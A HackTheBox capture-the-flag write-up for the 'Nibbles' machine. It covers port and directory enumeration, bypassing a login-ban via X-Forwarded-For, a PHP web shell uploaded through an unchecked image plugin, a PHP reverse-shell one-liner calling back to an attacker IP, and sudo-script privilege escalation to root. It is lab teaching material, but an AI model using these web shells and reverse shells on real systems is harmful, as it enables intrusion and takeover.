---
title: Nibbles
description: Nibbles box from HackTheBox write up.
---

# Nibbles <a href='/assets/resources/HackTheBox/Nibbles-resources.zip' title="Download resources"> :material-folder-zip:{:alt="Download resources"} </a>

## Nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1000 -p- 10.10.10.75
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 12:48 EST
Nmap scan report for 10.10.10.75
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.93 seconds
```
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p80,22 10.10.10.75    
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 12:49 EST
Nmap scan report for 10.10.10.75
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.72 seconds
```

A website and SSH, let's start with the port 80 and check what we can get from it.

## Port 80

The site only contains a 'Hello world' message but inspecting the code we can see a code comment:
```html
 <!-- /nibbleblog/ directory. Nothing interesting here! -->
```
Visiting `/nibbleblog/` will reveal a blog, let's enumerate it.

### Nibbleblog

Nibbleblog is an engine for blog creation. Using Gobuster:
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/12/04 12:58:04 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2987]
/sitemap.php          (Status: 200) [Size: 402] 
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/] 
/feed.php             (Status: 200) [Size: 302]                                             
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]  
/admin.php            (Status: 200) [Size: 1401]                                            
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]                                              
/update.php           (Status: 200) [Size: 1622]                                            
/README               (Status: 200) [Size: 4628]                                            
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]       
===============================================================
2021/12/04 13:03:24 Finished
===============================================================
```
We can see some interesting things, checking the `README` file reveals the version of the site: `4.0.3`. Let's see if something exists for this version:
```
┌──(kali㉿kali)-[~]
└─$ searchsploit Nibbleblog  
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                             | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                              | php/remote/38489.rb
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The second one sounds cool but needs an authenticated user so time to move on. 

We can try to brute force the `/admin.php` page. To help with this, the file `/nibbleblog/content/private/users.xml` contains the users registered in the application which, in this case, only contains the `admin` user. This file also reveals something not good, looks like the application is blocking IPs out after a number of failed logins (Checking the application code shows that the ban is 5 minutes long after 5 unsuccessful logins).

I decided to change the `X-Forwarded-For` header to see if the block can be bypassed and... actually it worked! So time for Python and a custom brute force tool... or not. The password was `nibbles` and yes, my Python code found the password, but I should have tried a bit harder with the default credentials becasue it would have been faster, lesson learnt. The Python code I wrote is uploaded as a resource if someone wants to check it out.

Now we can continue with the exploit we found earlier and get access to the box.

#### RCE

Checking the Metasploit exploit found by `searchsploit` it is easy where to look for our foothold. There is a plugin called "My image" that lets you upload images to the site, the thing is that it is not checking the files so a web shell can be used instead. The uploaded files are located at `/nibbleblog/content/private/plugins/my_image/`.

I uploaded a simple PHP web shell to get code execution:
```php
<?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
```
And then spinning up a listener and with a reverse shell like this (Remember to URL encode it!):
```bash
php -r '$sock=fsockopen("10.10.14.26",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```
We get access to the machine!
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080 
listening on [any] 8080 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.75] 52934
/bin/sh: 0: can't access tty; job control turned off
$
```
The user flag is under `/home/nibbler/user.txt`.

## Privilege escalation

Right now we have access as the `nibbler` user. In its `home` directory we can find a `personal.zip` file that contains a monitoring script and if we check if we can use `sudo`:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

There it is our attack vector. Since we have control over that script route we can just change the contents of the `monitor.sh` script with:
```bash
#! /bin/bash
bash
```

Executing our new script with `sudo` will give us a `root` shell:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler/personal/stuff#
```
The `root` flag is under `/root/root.txt`.
